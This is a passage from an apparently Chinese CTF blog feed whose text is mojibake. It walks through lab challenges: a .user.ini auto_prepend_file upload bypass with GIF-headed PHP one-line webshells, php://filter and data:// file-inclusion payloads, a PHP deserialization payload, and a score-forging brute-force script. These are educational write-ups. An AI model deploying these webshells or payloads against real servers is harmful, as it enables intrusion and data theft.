title="é…ç½®æ–‡ä»¶çš„åˆ©ç”¨ï¼š"></a>é…ç½®æ–‡ä»¶çš„åˆ©ç”¨ï¼š</h5><p><code>php.ini</code>ä¸­çš„é…ç½®é¡¹ä¸­å¾ˆå¤šæ•æ„Ÿçš„é…ç½®é¡¹ï¼Œéƒ½æ˜¯<code>PHP_INI_SYSTEM</code>æ¨¡å¼çš„ï¼ˆç”šè‡³æ˜¯php.ini onlyçš„ï¼‰ï¼ŒåŒ…æ‹¬<code>disable_functions</code>ã€<code>extension_dir</code>ã€<code>enable_dl</code>ç­‰ã€‚éƒ½æ˜¯æˆ‘ä»¬è¿˜æ˜¯æ‰¾åˆ°ä¸¤ä¸ªå¯ä»¥ç”¨æ¥åˆ©ç”¨çš„é…ç½®é¡¹ï¼ˆä¸‹å›¾çš„ä¸€å’Œå››ï¼‰</p><p><img src="/2021/07/14/buuctf6/image-20210717110429438.png" alt="image-20210717110429438"></p><p><strong>auto_prepend_fileï¼š</strong>æŒ‡å®šä¸€ä¸ªæ–‡ä»¶ï¼Œè‡ªåŠ¨åŒ…å«åœ¨è¦æ‰§è¡Œçš„æ–‡ä»¶å‰ï¼Œç±»ä¼¼äºåœ¨<strong>æ–‡ä»¶å‰</strong>è°ƒç”¨äº†require()å‡½æ•°ã€‚</p><p><strong>auto_append_fileï¼š</strong>ä¸<code>auto_prepend_file</code>é…ç½®é¡¹åŠŸèƒ½ç±»ä¼¼ï¼Œåªæ˜¯åœ¨æ–‡ä»¶åé¢åŒ…å«ã€‚ </p><p>ä½¿ç”¨æ–¹æ³•å¾ˆç®€å•ï¼Œç›´æ¥å†™åœ¨.user.iniä¸­ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file&#x3D;webshell.gif</span><br></pre></td></tr></table></figure><p>å› æ­¤æ‡‚å¾—äº†<code>.user.ini</code>çš„åˆ©ç”¨ï¼Œè¿™é¢˜çš„æ€è·¯å°±æ‰“å¼€äº†ï¼Œä½†æ˜¯è¦æ³¨æ„çš„æ˜¯åˆ©ç”¨çš„å‰ææ˜¯å«æœ‰.user.iniçš„æ–‡ä»¶å¤¹ä¸‹éœ€è¦æœ‰æ­£å¸¸çš„phpæ–‡ä»¶ï¼Œå¦åˆ™ä¹Ÿä¸èƒ½åŒ…å«äº†ã€‚å› æ­¤æˆ‘ä»¬å…ˆéªŒè¯ä¸€ä¸‹æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶å¤¹å†…æ˜¯å¦å­˜åœ¨phpæ–‡ä»¶ï¼Œç„¶åæˆ‘ä¸Šä¼ äº†å¾ˆå¤šä¸ªæ–‡ä»¶</p><p><img src="/2021/07/14/buuctf6/image-20210717180500162.png" alt="image-20210717180500162"></p><p>å‘ç°ä¸Šä¼ çš„æ–‡ä»¶å¤¹ä¸­å­˜åœ¨index.phpï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æ”¾å¿ƒçš„åˆ©ç”¨å•¦</p><p>æˆ‘ä»¬å…ˆä¸Šä¼ ä¸€ä¸ªæˆ‘ä»¬çš„.user.ini  ï¼Œä½†æ˜¯ä»–è¿™é‡Œå­˜åœ¨æ–‡ä»¶å¤´å†…å®¹æ£€æŸ¥ï¼Œå› æ­¤æˆ‘ä»¬åŠ ä¸Šgifæ–‡ä»¶å¤´ä¿®é¥°ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file&#x3D;webshell.gif</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ æˆåŠŸ</p><p><img src="/2021/07/14/buuctf6/image-20210717175245869.png" alt="image-20210717175245869"></p><p>æ¥ç€ä¸Šä¼ æˆ‘ä»¬çš„ä¸€å¥è¯æœ¨é©¬webshell.gifï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;</span><br></pre></td></tr></table></figure><p>å‘ç°å®ƒè¿‡æ»¤äº†<code>&lt;?</code>ï¼Œå› æ­¤å†å¯¹æˆ‘ä»¬çš„ä¸€å¥è¯æœ¨é©¬æ”¹å†™webshell2.gifï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;eval($_POST[&#39;pass&#39;])&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ æˆåŠŸ</p><p><img src="/2021/07/14/buuctf6/image-20210717175259925.png" alt="image-20210717175259925"></p><p>è¿™è¾¹æœ‰ä¸€ç‚¹è¦æ³¨æ„çš„æ˜¯æˆ‘æŠŠä¿®æ”¹åçš„æœ¨é©¬æ”¹åä¸ºäº†webshell2.gifï¼Œæ‰€ä»¥<code>.user.ini</code>å†…å¯¹åº”çš„æ–‡ä»¶åä¹Ÿè¦è¿›è¡Œæ”¹å†™</p><p>å…¨éƒ¨ä¸Šä¼ æˆåŠŸä»¥åï¼Œæœ‰ä¸¤ç§æ–¹æ³•å¯ä»¥è·å–flagã€‚</p><p><strong>ç¬¬ä¸€ç§</strong>ç”¨èšå‰‘è¿æ¥ï¼Œå†æ‰“å¼€è™šæ‹Ÿç»ˆç«¯ï¼Œè¾“å…¥æŒ‡ä»¤<code>cat /flag</code></p><p><img src="/2021/07/14/buuctf6/image-20210717181245508.png" alt="image-20210717181245508"></p><p><strong>spï¼š</strong>è¿™è¾¹è¿˜æœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„ï¼ŒæœåŠ¡å™¨ä¼šå®šæœŸåˆ é™¤ä¸Šä¼ çš„æ–‡ä»¶ä»¥ç¡®ä¿æœåŠ¡å™¨å®‰å…¨ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å°½å¿«è¿æ¥èšå‰‘ï¼Œå®Œæˆæ“ä½œã€‚</p><p><strong>ç¬¬äºŒç§</strong>å°±æ˜¯ç›´æ¥ä¼ å‚ï¼Œpostæˆ‘ä»¬å†™çš„ä¸€å¥è¯æœ¨é©¬å¯¹åº”çš„å˜é‡ï¼Œæ‰«ææ ¹ç›®å½•å¹¶ä»¥æ•°ç»„æ–¹å¼å›æ˜¾è¾“å‡ºæ–‡ä»¶å<img src="/2021/07/14/buuctf6/image-20210717200923303.png" alt="image-20210717200923303"></p><p><img src="/2021/07/14/buuctf6/image-20210717201113683.png"></p><p>æˆ‘ä»¬çœ‹åˆ°å­˜åœ¨flagæ–‡ä»¶ï¼Œå°è¯•è¯»å–å®ƒï¼š<img src="/2021/07/14/buuctf6/image-20210717201906697.png" alt="image-20210717201906697"></p><p>å‚è€ƒèµ„æ–™ï¼š<a href="https://www.php.net/manual/zh/ini.list.php">https://www.php.net/manual/zh/ini.list.php</a></p><p><a href="https://blog.csdn.net/weixin_44077544/article/details/102688564">https://blog.csdn.net/weixin_44077544/article/details/102688564</a></p><p><a href="https://blog.csdn.net/RABCDXB/article/details/113623796">https://blog.csdn.net/RABCDXB/article/details/113623796</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;SUCTF-2019-CheckIn&quot;&gt;&lt;a href=&quot;#SUCTF-2019-CheckIn&quot; class=&quot;headerlink&quot; title=&quot;[SUCTF 2019]CheckIn&quot;&gt;&lt;/a&gt;[SUCTF 2019]CheckIn&lt;/h1&gt;&lt;p&gt;æ‰“å¼€å®¹å™¨</summary>
      
    
    
    
    
    <category term="åˆ·é¢˜" scheme="http://example.com/tags/%E5%88%B7%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>æ”»é˜²ä¸–ç•Œwebè¿›é˜¶</title>
    <link href="http://example.com/2021/07/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B63/"/>
    <id>http://example.com/2021/07/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B63/</id>
    <published>2021-07-13T02:46:25.000Z</published>
    <updated>2021-07-15T10:18:12.332Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h1><p>æ‰“å¼€å®¹å™¨ï¼Œå‘ç°ä¸€æ®µä»£ç :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span>  </span><br><span class="line">$text = $_GET[<span class="string">&quot;text&quot;</span>];</span><br><span class="line">$file = $_GET[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">$password = $_GET[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents($text,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);  <span class="comment">//useless.php</span></span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        <span class="keyword">echo</span> $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æˆ‘ä»¬ä¸Šä¼ ä¸‰ä¸ªå‚æ•°ï¼Œå…ˆçœ‹çœ‹ä»–çš„åˆ¤æ–­è¯­å¥ï¼šåˆ¤æ–­æ˜¯å¦å­˜åœ¨textå˜é‡ï¼Œå¹¶ä»¥åªè¯»æ–¹å¼æ‰“å¼€æ–‡ä»¶åˆ¤æ–­æ–‡ä»¶å†…å®¹æ˜¯å¦ä¸º<code>welcome to the zjctf</code>ï¼›æ¥ç€åˆ¤æ–­ä¸Šä¼ çš„æ–‡ä»¶åæ˜¯å¦æœ‰æ•æ„Ÿè¯flagï¼Œè‹¥ä¸å­˜åœ¨åˆ™æ‰§è¡Œincludeå‡½æ•°ï¼›æœ€åå°†ä¸Šä¼ çš„passwordçš„å€¼ååºåˆ—åŒ–å¹¶è¾“å‡ºã€‚</p><p>æˆ‘ä»¬ä¸€æ­¥æ­¥æ¥ï¼Œå…ˆçœ‹ç¬¬ä¸€æ­¥ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¾ˆæ˜æ˜¾ä¸å­˜åœ¨textæ–‡ä»¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥ç›´æ¥ç»™textèµ‹å€¼<code>welcome to the zjctf</code>å‘¢ï¼Ÿä½†æ˜¯è¯•ç€ç›´æ¥èµ‹å€¼ï¼Œå‘ç°æ²¡æœ‰å›æ˜¾ï¼Œå› æ­¤è¯´æ˜ç›´æ¥èµ‹å€¼è‚¯å®šæ˜¯ä¸è¡Œçš„ã€‚æˆ‘ä»¬å°è¯•ç€ä½¿ç”¨httpä¼ªåè®®ï¼Œè¯•è¯•èƒ½ä¸èƒ½è¡Œã€‚</p><p><strong>ç¬¬ä¸€ç§php://input</strong></p><p>æ­¤åè®®éœ€è¦ allow_url_include ä¸º on ï¼Œå¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµ, å°†postè¯·æ±‚ä¸­çš„æ•°æ®ä½œä¸º PHPä»£ç æ‰§è¡Œã€‚å½“ä¼ å…¥çš„å‚æ•°ä½œä¸ºæ–‡ä»¶åæ‰“å¼€æ—¶ï¼Œå¯ä»¥å°†å‚æ•°è®¾ä¸º php://input ,åŒæ—¶postæƒ³è®¾ç½®çš„æ–‡ä»¶å†…å®¹ï¼Œphpæ‰§è¡Œæ—¶ä¼šå°†postå†…å®¹å½“ä½œæ–‡ä»¶å†…å®¹ã€‚<br>è¿™é‡Œç”¨ <code>HackBar</code> æŠ¥é”™äº†<img src="/2021/07/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B63/image-20210715165922619.png" alt="image-20210715165922619"></p><p>ä½†æ˜¯ç”¨bpæŠ“åŒ…ï¼Œå†ä¸Šä¼ å°±çœ‹åˆ°æœ‰å›æ˜¾ï¼Œè¯´æ˜è¿™æ ·å­æ˜¯å¯è¡Œçš„ã€‚</p><p><strong>ç¬¬äºŒç§data://ä¼ªåè®®</strong></p><p>data://åè®®éœ€è¦æ»¡è¶³åŒonæ¡ä»¶ï¼Œä½œç”¨å’Œ php://input ç±»ä¼¼</p><p>è¿™é‡Œæœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒæŒ‰ç…§ä¸Šè¿°æ–¹æ³•åªè¯»æµæ—¶ï¼Œè¦æŠŠphpä»£ç ç”¨base64ç¼–ç åå†ä¸Šä¼ ï¼Œå› ä¸ºå¦‚æœæˆ‘ä»¬ç›´æ¥ä¸Šä¼ å¯èƒ½æœ‰äº›å­—ç¬¦ä¼šè¢«è¿‡æ»¤ã€‚</p><p>å› æ­¤ç¬¬ä¸€æ­¥çš„payloadï¼š<code>?text=data:text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</code></p><p>å†çœ‹ç¬¬äºŒæ­¥ï¼Œæˆ‘ä»¬æ³¨æ„åˆ°æœ‰includeå‡½æ•°ï¼Œé‚£ä¹ˆå¯èƒ½å°±å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œç”¨<code>php://filter</code>æ–‡ä»¶è¯»å–æµï¼Œç›´æ¥è¯»å–flag.phpè‚¯å®šæ˜¯ä¸è¡Œçš„äº†ï¼Œå› ä¸ºç¬¬äºŒä¸ªåˆ¤æ–­å°±è¦æ»¡è¶³æ–‡ä»¶åä¸­ä¸åŒ…å«flagå­—è¯ã€‚æ­¤å¤„åˆæé†’æˆ‘ä»¬æœ‰ä¸€ä¸ªuselessæ–‡ä»¶ï¼Œå› æ­¤æˆ‘ä»¬å°è¯•è¯»å–è¯¥æ–‡ä»¶å†…å®¹</p><p>ç¬¬äºŒæ­¥çš„payloadï¼š<code>file=php://filter/read=convert.base64-encode/resource=useless.php</code></p><p><img src="/2021/07/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B63/image-20210715165754328.png" alt="image-20210715165754328"></p><p>å¯¹å›æ˜¾çš„å†…å®¹è¿›è¡Œbase64è§£ç å³å¯ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">php  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure><p>ä»£ç å®¡è®¡å‘ç°åŒ…å«æ–‡ä»¶ä¸­çš„å˜é‡fileæ²¡æœ‰åšä»»ä½•é˜²æŠ¤æªæ–½ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥éšæ„æ§åˆ¶fileçš„å€¼ã€‚</p><p>é™„ä¸Šexpï¼š</p><p><img src="/2021/07/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B63/image-20210715171559909.png" alt="image-20210715171559909"></p><p>ä»£ç æ‰§è¡Œå®Œåä¼šäº§ç”Ÿåºåˆ—åŒ–å­—ç¬¦ä¸²ï¼š<code>O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code>ï¼›</p><p>å½“æˆ‘ä»¬æŠŠè¿™ä¸²å­—ç¬¦ä¸²ä½œä¸ºå‚æ•°passwordçš„å€¼ä¸Šä¼ åï¼Œ<code>unserialize</code>å‡½æ•°å°†å…¶ååºåˆ—åŒ–ï¼Œè¿™æ—¶ç»“åˆ<code>file_get_contents</code>å‡½æ•°æ‰“å¼€flag.phpæ–‡ä»¶ï¼Œè¯»å–å¹¶è¾“å‡ºå›æ˜¾ã€‚</p><p>å› æ­¤è¿™å°±æ„æˆäº†ç¬¬ä¸‰ä¸ªpayloadï¼š<code>?password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code></p><p>æ€»ç»“ä¸Šè¿°çš„ä¸‰ä¸ªpayloadï¼Œå°†ä»–ä»¬åˆæˆä¸€ä¸ªï¼š</p><p><code>?text=data:text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code></p><p><img src="/2021/07/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B63/image-20210715172620323.png" alt="image-20210715172620323"></p><p>F12æŸ¥çœ‹æºç è·å¾—flagï¼š<img src="/2021/07/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B63/image-20210715172736646.png" alt="image-20210715172736646"></p><h3 id="æ€»ç»“ï¼š"><a href="#æ€»ç»“ï¼š" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h3><p>è¿™æ˜¯ä¸€é“å…³äºhttpä¼ªåè®®ã€æ–‡ä»¶åŒ…å«æ¼æ´å’Œååºåˆ—åŒ–çš„é¢˜ç›®ï¼Œåªè¦æ‡‚å¾—å¯¹åº”çš„ç‚¹æ„Ÿè§‰è¿˜æ˜¯æ¯”è¾ƒå®¹æ˜“çš„ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ZJCTF-2019-NiZhuanSiWei&quot;&gt;&lt;a href=&quot;#ZJCTF-2019-NiZhuanSiWei&quot; class=&quot;headerlink&quot; title=&quot;[ZJCTF 2019]NiZhuanSiWei&quot;&gt;&lt;/a&gt;[ZJCTF 2019]NiZh</summary>
      
    
    
    
    
    <category term="åˆ·é¢˜" scheme="http://example.com/tags/%E5%88%B7%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>bugku3</title>
    <link href="http://example.com/2021/07/12/bugku3/"/>
    <id>http://example.com/2021/07/12/bugku3/</id>
    <published>2021-07-12T10:33:50.000Z</published>
    <updated>2021-07-12T13:44:16.450Z</updated>
    
    <content type="html"><![CDATA[<p>æœ€è¿‘çœ‹bugkuæ–°ä¸Šäº†ä¸€æ³¢é¢˜ï¼Œå°±åšä¸€ä¸‹</p><h1 id="Game1"><a href="#Game1" class="headerlink" title="Game1"></a>Game1</h1><p>æ‰“å¼€å®¹å™¨ï¼Œå‘ç°æ˜¯ä¸€ä¸ªæ­æˆ¿å­çš„å°æ¸¸æˆï¼Œä¸€èˆ¬è¿™ç§é¢˜éƒ½æ˜¯é ä¿®æ”¹å¾—åˆ†æ¥è¾¾åˆ°è·å–flagè¦æ±‚ã€‚</p><p>f12æŸ¥çœ‹æºç ï¼š</p><p><img src="/2021/07/12/bugku3/image-20210712195230060.png" alt="image-20210712195230060"></p><p>æ³¨æ„åˆ°ä¸€ä¸ªæäº¤æ–‡ä»¶ï¼Œä»–åŒ…æ‹¬äº†ä¸‰ä¸ªå˜é‡â€”â€”scoreå°±æ˜¯è¯¥å±€æ¸¸æˆå¾—åˆ†ï¼Œipå›ºå®šä¸ºpppçš„å€¼ï¼Œsignä¸ºè¯¥å±€æ¸¸æˆå¾—åˆ†ç»è¿‡base64ç¼–ç åçš„å€¼</p><p>å› æ­¤æˆ‘ä»¬å¯ä»¥æ„é€ payloadï¼š<code>score.php?score=6666&amp;ip=110.90.9.142&amp;sign=NjY2Ng==</code></p><p>ä½†æ˜¯è¿™æ ·å›æ˜¾æ˜¯å¤±è´¥çš„ï¼Œä¸ºä»€ä¹ˆä¼šè¿™æ ·å‘¢ï¼Ÿè¯•ç©ä¸¤å±€æ¸¸æˆ<img src="/2021/07/12/bugku3/image-20210712195703946.png" alt="image-20210712195703946"></p><p>æˆ‘ä»¬çŸ¥é“50çš„base64ç¼–ç æ˜¯NTA=ï¼Œè€Œè¿™é‡Œçœ‹åˆ°ä»–å‰é¢è¿˜å¤šäº†å‰ç¼€zM</p><p>å¤šç©äº†å‡ å±€åå‘ç°ä»–çœŸå®çš„<code>sign=&#39;zM&#39;+&#39;Base64.encode(score.toString())&#39;+&#39;==&#39;</code></p><p>åŠ ä¸Šå‰ç¼€åå°±æˆåŠŸå¾—åˆ°flagå•¦</p><p><strong>spï¼š</strong>ç”±äºæœ€è¿‘åœ¨å­¦ä¹ pythonæ‰€ä»¥å°±å­¦ä¹ å¤§ä½¬çš„è„šæœ¬çœ‹çœ‹èƒ½ä¸èƒ½è·‘å‡ºçˆ†flagçš„ä¸´ç•Œç‚¹å†å“ªï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://114.67.246.176:15342/score.php?score=&quot;</span></span><br><span class="line">url2=<span class="string">&quot;&amp;ip=110.90.9.142&amp;sign=zM&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range (<span class="number">1000</span>,<span class="number">100000</span>):</span><br><span class="line">    i=str(i)</span><br><span class="line">    j=b64encode(i.encode())</span><br><span class="line">    j=j.decode()</span><br><span class="line">    r=requests.get(url+i+url2+j+<span class="string">&#x27;==&#x27;</span>)</span><br><span class="line">    print(i)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;å¤±è´¥äº†&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">print</span> (r.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img src="/2021/07/12/bugku3/image-20210712202522647.png" alt="image-20210712202522647"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸´ç•Œç‚¹å°±æ˜¯3000åˆ†</p><p>å‚è€ƒåšå®¢ï¼š<a href="https://blog.csdn.net/weixin_44190459/article/details/116648352">https://blog.csdn.net/weixin_44190459/article/details/116648352</a></p><h1 id="å˜é‡1"><a href="#å˜é‡1" class="headerlink" title="å˜é‡1"></a>å˜é‡1</h1><p>æ‰“å¼€å®¹å™¨æˆ‘ä»¬å°±å¯ä»¥çœ‹åˆ°æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag1.php&quot;</span>;</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;args&#x27;</span>]))&#123;</span><br><span class="line">    $args = $_GET[<span class="string">&#x27;args&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/^\w+$/&quot;</span>,$args))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;args error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;var_dump($<span class="subst">$args</span>);&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>ä»£ç å®¡è®¡æˆ‘ä»¬å¾—çŸ¥æˆ‘ä»¬ä¼ å‚çš„å€¼å®šåªå«æ•°å­—ï¼Œå­—æ¯ï¼Œä¸‹åˆ’çº¿ã€‚å› æ­¤è¿™é‡Œè¿‡æ»¤äº†æ‰€æœ‰çš„ç¬¦å·ã€‚</p><p>ä½†æ˜¯æˆ‘ä»¬çœ‹åˆ°è¿™é‡Œå­˜åœ¨ä¸€ä¸ªå¯å˜å˜é‡ï¼Œ<br><strong>å¯å˜å˜é‡</strong>ï¼š</p><p><code>æ˜¯ä¸€ç§ç‹¬ç‰¹çš„å˜é‡ï¼Œå®ƒå…è®¸åŠ¨æ€æ”¹å˜ä¸€ä¸ªå˜é‡åç§°ã€‚å…¶å·¥ä½œåŸç†æ˜¯è¯¥å˜é‡çš„åç§°ç”±å¦å¤–ä¸€ä¸ªå˜é‡çš„å€¼æ¥ç¡®å®šï¼Œå®ç°è¿‡ç¨‹å°±æ˜¯åœ¨å˜é‡çš„å‰é¢å†å¤šåŠ ä¸€ä¸ªç¾å…ƒç¬¦å·â€œSâ€ã€‚</code></p><p>è€Œè¿™é‡Œ**var_dump()**å‡½æ•° æ˜¾ç¤ºå…³äºä¸€ä¸ªæˆ–å¤šä¸ªè¡¨è¾¾å¼çš„ç»“æ„ä¿¡æ¯ï¼ŒåŒ…æ‹¬è¡¨è¾¾å¼çš„ç±»å‹ä¸å€¼ã€‚ç»“åˆå¯å˜å˜é‡åé‚£ä¹ˆå°±ä¼šè¿”å›å¯¹åº”çš„é”®å€¼ã€‚</p><p>æ­¤æ—¶æˆ‘ä»¬è¦è”æƒ³åˆ°phpä¸­è¶…å…¨å±€å˜é‡ <code>$GLOBALS </code>ï¼ŒPHP åœ¨åä¸º<code>$GLOBALS[index]</code>çš„æ•°ç»„ä¸­å­˜å‚¨äº†æ‰€æœ‰å…¨å±€å˜é‡</p><p>å› æ­¤æ„é€ payloadï¼š<code>?args=GLOBLAS</code></p><p><img src="/2021/07/12/bugku3/image-20210712210315711.png" alt="image-20210712210315711"></p><p>å‚è€ƒåšå®¢ï¼š<a href="https://blog.csdn.net/xuchen16/article/details/82737194">https://blog.csdn.net/xuchen16/article/details/82737194</a></p><h1 id="ç§‹åå±±è½¦ç¥"><a href="#ç§‹åå±±è½¦ç¥" class="headerlink" title="ç§‹åå±±è½¦ç¥"></a>ç§‹åå±±è½¦ç¥</h1><p>ç‚¹å¼€å®¹å™¨å°±ç»™æˆ‘ä»¬ä¸€é•¿ä¸²æ•°å­—è¦æˆ‘ä»¬åœ¨ä¸¤ç§’å†…è®¡ç®—å®Œæˆï¼Œæ˜¾ç„¶æ˜¯ä¸å¯èƒ½å®ç°çš„ï¼Œå› æ­¤éœ€è¦æ„é€ è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 